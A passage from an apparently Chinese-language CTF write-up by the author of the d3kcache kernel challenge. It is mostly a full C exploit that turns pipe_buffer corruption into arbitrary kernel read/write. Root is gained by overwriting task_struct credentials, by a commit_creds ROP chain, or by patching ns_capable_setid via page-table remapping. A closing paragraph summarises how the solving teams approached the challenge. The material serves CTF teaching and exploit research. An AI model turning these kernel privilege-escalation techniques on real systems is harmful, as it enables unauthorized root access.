class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-50</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">363</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">377</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">363</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">364</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">377</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br><br><span class="hljs-type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;<br><span class="hljs-type">size_t</span> stack_addr, stack_addr_another;<br><span class="hljs-type">size_t</span> stack_page, mm_struct_page;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> pte_val;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve_for_3_level</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    <span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br><br>    <span class="hljs-comment">/* read current task_struct */</span><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>    mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br><br>    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br><br>    <span class="hljs-comment">/* read mm_struct */</span><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br><br>    <span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>    pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span><br><span class="hljs-comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span><br><span class="hljs-comment"> * But what I want is a more novel and general exploitation that </span><br><span class="hljs-comment"> * doesn&#x27;t need any information about the kernel image. </span><br><span class="hljs-comment"> * So just simply overwrite the task_struct is good :)</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If you still want a normal ROP, refer to following codes.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff810157aa</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br>    <br>    <span class="hljs-comment">/* reading the page table directly to get physical addr of kernel stack*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading page table...&quot;</span>);<br><br>    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>    stack_addr_another += page_offset_base;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br><br>    <span class="hljs-comment">/* construct the ROP */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x100</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>        rop[idx++] = RET + kernel_offset;<br>    &#125;<br><br>    rop[idx++] = POP_RDI_RET + kernel_offset;<br>    rop[idx++] = INIT_CRED + kernel_offset;<br>    rop[idx++] = COMMIT_CREDS + kernel_offset;<br>    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>    stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_usma</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span><br><br>    <span class="hljs-type">char</span> *kcode_map, *kcode_func;<br>    <span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br><br>    kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>        kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>           dst_vaddr);<br><br>    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br>    dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br><br>    <span class="hljs-comment">/* remapping to our mmap area */</span><br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/* overwrite kernel code segment directly */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span><br><span class="hljs-comment">     * so we can just patch it to let it always return true :)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x40</span>); <span class="hljs-comment">/* nop */</span><br>    <span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>) + <span class="hljs-number">0x40</span>, <br>            <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>            <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>            <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>            <span class="hljs-number">12</span>);<br><br>    <span class="hljs-comment">/* get root now :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Just for testing CFI&#x27;s availability :)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger_control_flow_integrity_detection</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pbuf</span> =</span> (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)buf + TRD_PIPE_BUF_SZ);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>, *<span class="hljs-title">ops_addr</span>;</span><br><br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) <br>                 (((<span class="hljs-type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="hljs-number">0x40</span> * <span class="hljs-number">0x1000</span>);<br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*)((<span class="hljs-type">size_t</span>)ops_addr+page_offset_base);<br><br>    <span class="hljs-comment">/* two random gadget :) */</span><br>    ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) buf;<br>    ops-&gt;confirm = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff81a78568</span> + kernel_offset);<br>    ops-&gt;release = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff816196e6</span> + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        pbuf-&gt;ops = ops_addr;<br>        pbuf = (<span class="hljs-keyword">struct</span> pipe_buffer *)((<span class="hljs-type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);<br>    &#125;<br><br>    evil_2nd_buf.page = info_pipe_buf.page;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_4th_buf,<span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_2nd_buf,<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>        <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_3rd_buf,<span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], buf, <span class="hljs-number">0xf00</span>); <br><br>    <span class="hljs-comment">/* trigger CFI... */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);<br>    sleep(<span class="hljs-number">5</span>);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.O - fundamental works</span><br><span class="hljs-comment">     */</span><br><br>    save_status();<br><br>    <span class="hljs-comment">/* bind core to 0 */</span><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* dev file */</span><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pgv pages */</span><br>    prepare_pgv_system();<br>    prepare_pgv_pages();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span><br><span class="hljs-comment">     * making two pipe_buffer pointing to the same pages</span><br><span class="hljs-comment">     */</span><br>    corrupting_first_level_pipe_for_page_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span><br><span class="hljs-comment">     * leak page-related address and construct a second-level pipe uaf</span><br><span class="hljs-comment">     */</span><br>    corrupting_second_level_pipe_for_pipe_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span><br><span class="hljs-comment">     * construct three self-page-pointing pipe_buffer </span><br><span class="hljs-comment">     */</span><br>    building_self_writing_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV - leaking fundamental information by pipe</span><br><span class="hljs-comment">     */</span><br>    info_leaking_by_arbitrary_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V - different method of exploitation</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rop&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* traditionally root by rop */</span><br>        privilege_escalation_by_rop();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;cfi&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* extra - check for CFI&#x27;s availability */</span><br>        trigger_control_flow_integrity_detection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;usma&quot;</span>)) &#123;<br>        privilege_escalation_by_usma();<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* default: root by seeking init_task and overwrite current */</span><br>        privilege_escalation_by_task_overwrite();<br>    &#125;<br><br>    <span class="hljs-comment">/* we SHOULDN&#x27;T get there, so panic :( */</span><br>    trigger_control_flow_integrity_detection();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x03-解题情况"><a href="#0x03-解题情况" class="headerlink" title="0x03.解题情况"></a>0x03.解题情况</h1><p>本次比赛当中一共有 2 支队伍解出了笔者的题目，这个数量倒是出乎笔者的预料又在预料之中（<del>既感觉好多又感觉好少</del>），比较巧的是 <em>刚好一支国内队伍与一支国外队伍</em> ：）</p><p>NU1L 战队的解法是利用 partial overwrite 覆写 <code>msg_msg-&gt;m_list.next</code> 构造 UAF（有点像 CVE-2021-22555 的解法），分配 <code>msg_msgseg</code> 来构造 <code>fake msg_msg</code> 实现越界读，之后利用 <code>fcntl(F_SETPIPE_SZ)</code> 改小 <code>pipe_buffer</code> 后转移 UAF 到 <code>pipe_buffer</code> 上从而构造 dirty pipe 覆写 busybox，不过比较出乎笔者预料的是他们并没有用页级堆风水，而是选择<strong>直接堆喷大量 msg_msg</strong>，这样题目所在的 slub 页面与 